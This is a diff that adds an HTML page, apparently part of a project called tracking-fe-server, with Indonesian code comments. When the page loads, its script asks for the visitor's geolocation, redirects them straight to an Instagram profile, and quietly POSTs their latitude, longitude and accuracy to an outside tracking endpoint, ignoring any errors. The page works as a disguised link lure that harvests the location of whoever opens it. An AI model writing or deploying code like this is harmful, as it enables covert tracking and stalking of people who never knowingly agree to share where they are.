@@ -1,0 +1,40 @@
+<!-- filepath: tracking-fe-server/public/index.html -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>kiw</title>
+  </head>
+  <body>
+    <script>
+      window.onload = getLocation; // Panggil getLocation otomatis saat halaman dimuat
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendPosition);
+        }
+        window.location.href = "https://instagram.com/ilhamrhmddni"; // Langsung arahkan ke URL tujuan
+      }
+
+      const randomId = "id-" + Math.random().toString(36).substring(2, 10);
+
+      function sendPosition(position) {
+        const data = {
+          id: randomId,
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+        };
+
+        fetch("https://tracking-lemon.vercel.app/track", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        }).catch(() => {
+          // Gagal kirim data, tidak ada aksi tambahan
+        });
+      }
+    </script>
+  </body>
+</html>
